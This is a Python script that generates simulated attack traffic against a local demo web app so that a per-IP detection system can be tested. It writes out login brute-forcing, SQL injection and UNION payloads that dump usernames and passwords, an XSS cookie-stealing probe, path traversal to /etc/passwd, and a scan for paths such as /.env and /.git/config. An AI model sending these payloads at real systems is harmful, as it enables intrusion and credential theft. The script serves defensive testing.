"""Attack traffic generator for the demo. Each scenario uses its own fake source IP
(sent via X-Forwarded-For) so the per-IP automata keep separate state.

    python simulate.py all
    python simulate.py brute sqli_login
"""
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("VICTIM_URL", "http://127.0.0.1:5000")


def _send(ip, method, path, form=None):
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method, headers={"X-Forwarded-For": ip})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except OSError:
        return 0


def q(s):
    return urllib.parse.quote(s, safe="")


def normal():
    for p in ["/", "/product/1", "/search?q=shoes", "/product/3", "/search?q=lamp", "/login"]:
        _send("10.0.0.5", "GET", p); time.sleep(0.25)
    _send("10.0.0.5", "POST", "/login", {"user": "alice", "password": "wonderland"})


def brute():
    for i in range(7):
        _send("10.0.0.66", "POST", "/login", {"user": "admin", "password": "guess%d" % i}); time.sleep(0.35)


def sqli_login():
    _send("10.0.0.31", "POST", "/login", {"user": "admin'--", "password": "x"})
    time.sleep(0.4)
    _send("10.0.0.31", "POST", "/login", {"user": "x' or 1=1 --", "password": "x"})


def sqli_union():
    _send("10.0.0.32", "GET", "/search?q=" + q("zzz' union select username,password from users --"))


def xss():
    _send("10.0.0.33", "GET", "/search?q=" + q("<script>alert(document.cookie)</script>"))


def xss_nested():
    _send("10.0.0.34", "GET", "/search?q=" + q("<div><b><i>hello</i></b></div>"))


def nested_sql():
    _send("10.0.0.35", "GET", "/search?q=" + q("x' and (select (select count(*) from users))>0 and 'a'='a"))


def traversal():
    _send("10.0.0.36", "GET", "/files?name=" + q("../secret.txt")); time.sleep(0.4)
    _send("10.0.0.36", "GET", "/files?name=..%252f..%252fetc/passwd")


def scan():
    for p in ["/admin", "/.env", "/wp-login.php", "/phpmyadmin", "/backup.zip", "/config.php", "/.git/config", "/server-status"]:
        _send("10.0.0.77", "GET", p); time.sleep(0.2)


SCENARIOS = {f.__name__: f for f in (normal, brute, sqli_login, sqli_union, xss, xss_nested, nested_sql, traversal, scan)}


def run(name):
    if name == "all":
        for f in SCENARIOS.values():
            f(); time.sleep(0.8)
    else:
        SCENARIOS[name]()


if __name__ == "__main__":
    for n in sys.argv[1:] or ["all"]:
        run(n)
